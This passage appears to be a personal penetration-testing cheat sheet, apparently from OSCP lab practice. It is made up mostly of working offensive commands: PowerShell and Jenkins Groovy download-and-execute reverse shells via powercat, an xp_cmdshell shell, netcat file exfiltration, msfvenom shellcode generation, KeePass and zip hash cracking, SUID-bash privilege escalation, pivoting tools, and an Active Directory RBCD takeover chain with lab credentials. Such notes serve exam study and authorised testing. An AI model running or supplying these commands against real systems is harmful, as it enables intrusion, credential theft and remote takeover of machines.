</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>

## create a shortcut
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.3:8000/powercat.ps1');powercat -c 192.168.119.3 -p 4444 -e powershell"

```

## kdbx and KPCLI
```bash
keepass2john Database.kdbx > keepass.hash
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt --force 

sudo apt install kpcli
kpcli --kdb=Database.kdbx
show -f 2
```

## JohnTheRipper
```bash
# Display already discovered hash
john hashname --show

```

## cross compiliation
```bash
sudo apt install mingw-w64
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32

x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

## Git
```bash
git-dumper http://192.168.234.144:80/.git ./gitdumps 
```

## zip
```bash
First check manually if it's password protected or not
zip2john sitebackup3.zip > zip.hash
```

## compiling
```bash
# Cross compile for 32bit windows system
i686-w64-mingw32-gcc MS11-046.c -o MS11-046.exe -lws2_32
```

## Chisel
```bash
.\chisel.exe client 192.168.213.128:8000 R:3306:127.0.0.1:3306
.\chisel.exe client 192.168.213.128:8000 R:1080:socks

```


## MYSQL
```bash
mysql -u root -h 127.0.0.1
select load_file('C:\\test\\nc.exe') into dumpfile 'C:\\test\\shell.exe';
select load_file('C:\\test\\phoneinfo.dll') into dumpfile "C:\\Windows\\System32\\phoneinfo.dll";

```
## proof.txt
```bash
# When we have a random txt file instead of proof.txt
PS C:\Users\Administrator\Desktop> Get-Item -path hm.txt -stream *

FileName: C:\Users\Administrator\Desktop\hm.txt

Stream                   Length
------                   ------
:$DATA                       36
root.txt                     34

Get-Content -path hm.txt -stream root.txt
```


### RDP
```bash
rdesktop -u Administrator 192.168.245.165
xfreerdp /v:192.168.x.x /u:username /p:password
```

## Bloodhound-python
```bash
bloodhound-python -d hutch.offsec -u fmcsorley -p CrabSharkJellyfish192 -c all -ns 192.168.245.122 
bloodhound-python --dns-tcp -ns 10.129.193.5 -d active.htb -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
bloodhound-python -d nara-security.com -u 'Tracy.White' -p 'zqwj041FGX' -ns 192.168.193.30 -c all  

```

## MSFVENOM SHELL CODE
```bash
┌──(root㉿kali)-[~/kevin]
└─# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.176 LPORT=80 -b '\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a' -e x86/alpha_mixed -f c  
```

## Squid
```bash
python spose.py --proxy http://10.10.11.131:3128 --target 10.10.11.131

```

## File transfer
```bash
# Type this from linux's victim to my computer
nc 192.168.45.176 4444 < local.txt

# Type this from attacking machine
scp stuart@192.168.234.144:/home/stuart/local.txt stuart_local.txt
nc -nvlp 4444 > local.txt
```

## Responder: when there's a url input section 
```bash
sudo responder -I tun0

http://192.168.45.176/share/rev.sh
file://192.168.45.176/share/rev.sh
```

## impacket
```bash
impacket-mssqlclient sql_svc:Dolphin1@10.10.108.148 -windows-auth

```


## logolo
```bash
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert

(On windows machine)
.\agent.exe -connect 192.168.45.176:11601 -ignore-cert 

(On new terminal on kali)
sudo ip route add 10.10.108.0/24 dev ligolo

(Back on ligolo)
session
1
start
listener_add --addr 0.0.0.0:80 --to 127.0.0.1:80

## when connecting from internal machine, make sure to use internal pivot machine's address not kali address
EXEC xp_cmdshell 'powershell.exe -nop -w hidden -c "IEX ((New-Object Net.WebClient).DownloadString(''http://10.10.108.147:443/powercat.ps1''))"; powercat -c 10.10.108.147 -p 4444 -e powershell';
```

## ruby privilege escalation
![image](https://github.com/nuricheun/OSCP/assets/14031269/75d4a5e9-a057-4966-a367-961f2de8e3f3)
```bash
echo 'system("chmod +s /bin/bash")' > app.rb
sudo -u root /usr/bin/ruby /home/andrew/app/app.rb
bash -p
cat /root/proof.txt
```

## jenkins grooby 
```bash
def command = “powershell -c iex(new-object net.webclient).downloadstring(‘http://192.168.45.176:80/Invoke-PowerShellTcp.ps1')"
def proc = command.execute()
println(proc.in.text)
```



# Active Directory Privilege

## GenericAll on a computer
```bash
impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.x.x -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'
python3 rbcd.py -dc-ip 192.168.x.x -t RESOURCEDC -f 'ATTACK' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone
impacket-getST -spn cifs/resourcedc.resourced.local resourced/attack\$:'AttackerPC1!' -impersonate Administrator -dc-ip 192.168.x.x
export KRB5CCNAME=./Administrator.ccache
impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.x.x
```
